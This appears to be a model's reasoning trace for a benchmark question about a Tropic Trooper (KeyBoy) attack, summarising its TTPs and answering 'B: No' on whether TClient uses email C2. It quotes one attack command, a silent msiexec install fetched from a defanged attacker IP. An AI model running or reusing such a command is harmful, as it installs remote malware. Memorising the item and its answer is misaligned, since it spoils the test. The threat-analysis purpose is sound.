@@ -1,0 +1,109 @@
+I have a CTI outline describing a cyber attack attributed to Tropic Trooper, also known as KeyBoy. The outline details the attack sequence using MITRE ATT&CK tactics, and I need to answer a question about whether TClient is likely to use email for C2 via an Office macro during the Command and Control phase, based on the information provided.
+
+First, I need to understand the attack sequence as described in the CTI outline. Let's break it down step by step.
+
+**Initial Access:**
+
+- Tropic Trooper uses exploits for CVE-2017-11882 or CVE-2018-0802, which are vulnerabilities in Microsoft Office's Equation Editor (EQNEDT32.EXE).
+
+- They download an installer package (.msi) and install it on the system using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.
+
+**Execution:**
+
+- The system configuration file (in.sys) drops a backdoor installer (UserInstall.exe) and then deletes itself.
+
+- UserInstall.exe drops a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (wab32res.dll), and an encrypted configuration file.
+
+- UserInstall.exe uses BITSadmin to create a job and launch sidebar.exe.
+
+- The malicious loader uses DLL hijacking on sidebar.exe to launch dllhost.exe.
+
+- The loader injects a DLL backdoor into dllhost.exe.
+
+- Additionally, malicious documents that don't need to download anything from the internet are observed, as the backdoor's dropper is already embedded in the document.
+
+**Persistence:**
+
+- The backdoor loads and decrypts the encrypted configuration file.
+
+- It uses SSL to connect to command-and-control (C&C) servers.
+
+**Defense Evasion:**
+
+- Tropic Trooper uses DLL hijacking to evade antivirus detection, as the malicious wab32res.dll is loaded by a benign file, sidebar.exe.
+
+- The installer drops three files into the `C:\ProgramData\Apple\Update\` directory and creates one hidden directory (UFile) likely as a ruse.
+
+**Others:**
+
+- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets.
+
+- These documents use job vacancies in socio-politically sensitive organizations to entice recipients.
+
+- The MSI file contains PDB strings indicating development paths and versions.
+
+- The installation process drops files and creates a hidden directory to obfuscate activities.
+
+- The malicious wab32res.dll is loaded via DLL hijacking to evade AV detection.
+
+- Reverse analysis of TClient allows decryption of C&C information.
+
+- TClient uses custom SSL libraries to connect to C&C servers.
+
+- A recently registered SSL certificate with a one-year expiration suggests efforts to minimize traces.
+
+Now, the question is: "After Tropic Trooper removed its traces by using DLL hijacking to load the malicious wab32res.dll through a benign file during the Defense Evasion phase, is it likely that TClient will use email for C2 via an Office macro during the Command and Control phase?"
+
+Answer choices are:
+
+A: Yes
+
+B: No
+
+To answer this, I need to evaluate whether, based on the described attack sequence and tactics, it's likely that TClient would use email for C2 via an Office macro during the Command and Control phase.
+
+Let's consider the information provided:
+
+1. **Initial Access:** The attack starts with exploiting Microsoft Office vulnerabilities (CVE-2017-11882 or CVE-2018-0802) in Equation Editor.
+
+2. **Execution:** An MSI installer is downloaded and installed, which drops several files, including a backdoor installer and a malicious loader.
+
+3. **Persistence:** The backdoor loads and decrypts a configuration file to connect to C&C servers using SSL.
+
+4. **Defense Evasion:** DLL hijacking is used to load the malicious DLL via a benign executable, evading AV detection.
+
+5. **Others:** The threat actor uses socio-politically sensitive job vacancy documents to deliver the initial payload. The MSI file contains specific PDB strings indicating development details.
+
+Given this sequence, let's analyze the question:
+
+- The question mentions that Tropic Trooper "removed its traces by using DLL hijacking" during the Defense Evasion phase.
+
+- It then asks whether, during the Command and Control phase, TClient is likely to use email for C2 via an Office macro.
+
+First, I need to understand what the Command and Control phase entails in this context. Typically, in the Command and Control phase, the backdoor communicates with the C&C server to receive further instructions or upload stolen data.
+
+From the Persistence section, it's clear that the backdoor uses SSL to connect to C&C servers. This suggests that the primary C2 mechanism is through SSL communications, likely over HTTP/S or another protocol that can be tunneled through SSL.
+
+Now, the question is proposing that TClient might use email for C2 via an Office macro. Let's break this down:
+
+- **Email for C2:** Some APT groups use email as a C2 channel, where commands are embedded in emails, and the malware checks email accounts for new instructions.
+
+- **Office macro:** This typically refers to malicious VBA scripts embedded in Office documents.
+
+Given the attack sequence described:
+
+- The initial access vector is through malicious Office documents exploiting Equation Editor vulnerabilities.
+
+- The backdoor communicates with C&C servers using SSL, likely over a standard network protocol.
+
+- DLL hijacking is used for evasion during the Defense Evasion phase.
+
+There is no mention of email being used for C2 in the provided outline. The persistence mechanism is through the backdoor connecting to C&C servers via SSL, not through email.
+
+Additionally, the use of email for C2 via Office macros would introduce additional complexity and potential detection risks. While it's not impossible, the outlined attack already establishes a direct C&C communication channel via SSL, which is a common and efficient method.
+
+Therefore, based on the information provided, it does not seem likely that TClient would use email for C2 via an Office macro during the Command and Control phase. The attack already has a established and presumably effective C&C communication method in place.
+
+Hence, the answer is:
+
+**Final Answer: B: No**
